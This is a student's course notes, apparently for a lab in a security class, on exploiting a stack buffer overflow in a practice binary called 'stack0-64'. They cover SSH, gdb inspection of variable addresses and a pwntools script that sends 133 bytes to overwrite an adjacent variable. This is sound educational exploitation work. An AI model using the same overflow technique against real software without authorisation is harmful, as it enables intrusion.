---
attachments: [Clipboard_2023-03-13-14-20-37.png, Clipboard_2023-03-13-14-22-20.png, Clipboard_2023-03-13-14-34-46.png]
tags: [CS4401]
title: SSH
created: '2023-03-13T17:34:25.078Z'
modified: '2023-03-23T18:16:12.261Z'
---

# SSH
ssh -i keys jdmeza@server

cd ito directory
ls -l shows permissions
file ./stack0-64 shows file info

touch up on gdb and assembly
ctrl + d kills ssh or gdb

pwntools
figure out docker

man command - manual for commandv

int - 4 bytes
pointer = 4 or 8 depends 32 bit or 64 bit

with tmux

![](@attachment/Clipboard_2023-03-13-14-22-20.png)

p.sendline(b'string')
p.recvall()

run file
look for address of unsecured variable

p buffer # print buffer
info locals # tells info about local vars
x buffer # examines buffer, 
p &buffer # address of buffer
on 64bit **stack** address looks like #7fffffffff...XXXX or something
p address2 - address1 # use p/d instead to show decimal
gets does not retain new line, fgets does
in py file, p.sendline(b')

x/s &buffer shows all chars sent but p buffer shows only size of buffer, may be other things between buffer and unsecured

we know where buffered and unsecured are, now we can input something into buffer to make unsecured non 0

![](@attachment/Clipboard_2023-03-13-14-34-46.png)

to solve and run on server

s = ssh('jdmeza', servername, keyfile='./keys' or password)
s.set_working_directory(server directory location)
p = s.process('./stack0-64')

p.sendline(b'a'*133)
...










